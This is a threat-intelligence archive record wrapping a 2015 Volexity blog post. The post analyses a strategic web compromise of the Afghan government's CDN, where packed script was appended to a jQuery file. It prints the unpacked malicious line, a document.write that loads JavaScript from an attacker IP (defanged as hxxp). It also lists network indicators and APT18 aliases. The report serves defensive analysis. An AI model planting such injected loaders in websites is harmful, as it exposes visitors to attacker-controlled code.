{
    "id": "a1b02abc-a222-4dc0-8dc0-5d4da0aee868",
    "created_at": "2022-10-25T16:48:23.841284Z",
    "updated_at": "2025-03-27T02:16:45.74436Z",
    "deleted_at": null,
    "sha1_hash": "355d59c0f3e480734acb72f26f16f717d2984e6c",
    "title": "",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 471271,
    "plain_text": "[B](http://www.twitter.com/volexity) [M](http://www.volexity.com/blog/?feed=rss2)\n\n\nIncident Response &\n\nSuppression\n\n\n[Home](http://www.volexity.com/blog/)\n\n\n# Afghan Government Compromise: Browser Beware\n\n[Posted on June 12, 2015 by Steven Adair](http://www.volexity.com/blog/?p=134)\n\nVisiting a wide-ranging number of websites associated with the Government of Afghanistan may yield visitors an\n\nunwanted surprise. For the second time this year, malicious code has surfaced on, cdn.afghanistan.af, a host that\n\nserves as a content delivery network (CDN) for the Afghan government. Javascript code from this system is found on\n\nseveral different Afghan Offices, Ministries, and Authorities. This strategic web compromise (SWC) against the Afghan\n\nCDN server has effectively turned a large portion of the government’s websites into attack surfaces against visitors.\n\nVolexity recently detected malicious code being loaded after a user visited the websites for the President of\n\n**Afghanistan (www.president.gov.af).**\n\n## Second Round of Attacks\n\n[In a previous attack highlighted earlier in the year by ThreatConnect. One of the two primary Javascript files accessed](http://www.threatconnect.com/news/operation-poisoned-helmand/)\n\nfrom the CDN system was modified to load code from two different malicious URLs. In the past attacks, the following\n\nfile was modified to load unwanted Javascript:\n\nhttp://cdn.afghanistan.af/scripts/gop-script.js\n\nIn these instances the offending code was easily identifiable, as the attackers simply prepended document.write\n\nstatements to the very top of the gop-script.js file as seen below:\n\nHowever, this new round of malicious code has two primary differences. The first difference is the attackers chose to\n\nmodify a different file in this round. The offending code is no longer present in gop-script.js, as this file was cleaned\n\nup some time ago. However, malicious code is now found in the following Javascript code on the Afghan CDN\n\nwebsite:\n\nhttp://cdn.afghanistan.af/scripts/jquery-1.4.2.min.js\n\nThe next major difference is the attackers went through more of an effort to obfuscate their activity by appending\n\n[their code to the end of the file and by leveraging the Dean Edwards Packer with base62 encoding. In this instance,](http://dean.edwards.name/packer/)\n\nthe packer effectively makes it more difficult to discern exactly what the attackers have done just by looking at the\n\ncode. The image below shows the malicious code as it currently appears within the jquery-1.4.2.min.js file:\n\n\n-----\n\nTaking this Javascript and unpacking it results in a bit more recognizable code (note we have modified http to hxxp\n\nbelow):\n\ndocument.write(‘<script type=”text/javascript” src=\\”hxxp://176.58.101.24/Jquery/Jquery.js\\”></script>’);\n\nThis code will cause a visitor to attempt to retrieve Javascript from the Linode IP address 176.58.101.24 and load it into\n\nthe browser.\n\n## Selective Exploitation\n\nOne of the more interesting tactics that APT attackers have been employing in recent years is the usage of IP address\n\nwhitelisting. Volexity believes that the attackers behind the Afghan Government compromise likely have a specific set\n\nof targets that are potential recipients of malicious code via the 176.58.101.24 address. In all observed instances thus\n\nfar, only HTTP 403 (Forbidden) responses have been observed. This threat group has used similar tactics on other\n\nwebsites involved in strategic web compromises in the past as well. The only real way to identify the targets is to\n\nobserve the code actually being seen, or see the whitelist from the server itself. At this point we can only speculate\n\nthat Government and Defense entities are likely the intended targets of this campaign. If you check your logs and find\n\nHTTP 200 results, we would like to hear from you.\n\n## Network Indicators\n\nThe most straightforward and primary network indicator at this time is looking for for communication with the IP\n\n[address 176.58.101.24. ASN details via the Shadowserver IP-BGP service are shown below.](https://www.shadowserver.org/wiki/pmwiki.php/Services/IP-BGP)\n\n$ whois -h asn.shadowserver.org ‘origin 176.58.101.24’\n\n15830 | 176.58.96.0/19 | TELECITY | GB | linode.com | Linode LLC\n\n[This entry was posted in APT, Exploits, Vulnerabilities and tagged Afghanistan. Bookmark the permalink.](http://www.volexity.com/blog/?cat=4)\n\n\n[« A New Shellshock Worm on the Loose](http://www.volexity.com/blog/?p=118) APT Group Wekby Leveraging Adobe Flash Exploit (CVE\n2015-5119) »\n\n\nSearch …\n\n\n**Recent Posts**\n\nf[Virtual Private Keylogging:]\n\n[Cisco Web VPNs Leveraged for](http://www.volexity.com/blog/?p=179)\n\nAccess and Persistence\n\n\n-----\n\nExploit (CVE 2015 5119)\n\nf[Afghan Government]\n\nCompromise: Browser Beware\n\nf[A New Shellshock Worm on]\n\nthe Loose\n\nf[Drupal Vulnerability: Mass]\n\nScans & Targeted Exploitation\n\n\n**Archives**\n\n[f[October 2015]](http://www.volexity.com/blog/?m=201510)\n\n[f[July 2015]](http://www.volexity.com/blog/?m=201507)\n\n[f[June 2015]](http://www.volexity.com/blog/?m=201506)\n\n[f[April 2015]](http://www.volexity.com/blog/?m=201504)\n\n[f[October 2014]](http://www.volexity.com/blog/?m=201410)\n\n[f[September 2014]](http://www.volexity.com/blog/?m=201409)\n\n\n**Categories**\n\n[f[Adobe Flash]](http://www.volexity.com/blog/?cat=13)\n\n[f[APT]](http://www.volexity.com/blog/?cat=4)\n\n[f[China]](http://www.volexity.com/blog/?cat=6)\n\n[f[Digital Surveillance]](http://www.volexity.com/blog/?cat=9)\n\n[f[Drupal]](http://www.volexity.com/blog/?cat=10)\n\n[f[Exploits]](http://www.volexity.com/blog/?cat=3)\n\n[f[Hong Kong]](http://www.volexity.com/blog/?cat=7)\n\n[f[Japan]](http://www.volexity.com/blog/?cat=5)\n\n[f[Java]](http://www.volexity.com/blog/?cat=8)\n\n[f[Scanning]](http://www.volexity.com/blog/?cat=11)\n\n[f[Vulnerabilities]](http://www.volexity.com/blog/?cat=2)\n\n\n[© 2015 Volexity, LLC](http://www.volexity.com/blog/www.volexity.com)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.06.12.Afghan_Government_Compromise/Afghan%20Government%20Compromise_%20Browser%20Beware%20_%20Volexity%20Blog.pdf"
    ],
    "report_names": [
        "Afghan Government Compromise_ Browser Beware _ Volexity Blog"
    ],
    "threat_actors": [
        {
            "id": "c8aefee7-fb57-409b-857e-23e986cb4a56",
            "created_at": "2023-01-06T13:46:38.285223Z",
            "updated_at": "2025-03-27T02:00:02.79333Z",
            "deleted_at": null,
            "main_name": "APT18",
            "aliases": [
                "TG-0416",
                "SCANDIUM",
                "PLA Navy",
                "Wekby",
                "G0026",
                "DYNAMITE PANDA"
            ],
            "source_name": "MISPGALAXY:APT18",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "17b92337-ca5f-48bb-926b-c93b5e5678a4",
            "created_at": "2022-10-25T16:07:23.333316Z",
            "updated_at": "2025-03-27T02:02:09.74201Z",
            "deleted_at": null,
            "main_name": "APT 18",
            "aliases": [
                "APT 18",
                "Dynamite Panda",
                "Scandium",
                "TG-0416",
                "Wekby"
            ],
            "source_name": "ETDA:APT 18",
            "tools": [
                "AngryRebel",
                "AtNow",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HttpBrowser RAT",
                "HttpDump",
                "Moudour",
                "Mydoor",
                "PCRat",
                "Pisloader",
                "QUICKBALL",
                "Roseam",
                "StickyFingers",
                "Token Control",
                "TokenControl",
                "hcdLoader"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041805,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/355d59c0f3e480734acb72f26f16f717d2984e6c.pdf",
        "text": "https://archive.orkl.eu/355d59c0f3e480734acb72f26f16f717d2984e6c.txt",
        "img": "https://archive.orkl.eu/355d59c0f3e480734acb72f26f16f717d2984e6c.jpg"
    }
}